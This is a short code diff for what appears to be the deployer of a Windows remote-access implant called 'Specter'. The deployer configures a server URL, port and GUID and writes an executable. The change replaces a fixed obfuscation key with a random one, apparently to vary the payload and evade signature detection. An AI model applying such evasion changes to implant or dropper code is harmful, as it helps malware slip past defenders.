@@ -1,7 +1,7 @@
-#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
 #include "SpecterBasicDeployment.hpp"
+#include "SpecterLib/Algorithm.h"
 #include "SpecterLib/InitialConfig.h"
 #include "SpecterLib/StrUtils.h"
 
@@ -27,7 +27,7 @@ int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
 	std::string guid = "SPECTER_GUID_HERE";
 
 	// Deploy as normal user
-	uint8_t obscrypto_key = 'x';
+	uint8_t obscrypto_key = Algorithm::GenerateRandomUInt<uint8_t>();
 	InitialConfig initial_config(std::move(server_url), std::move(server_port), std::move(guid));
 
 	const std::wstring filename = name + L".exe";
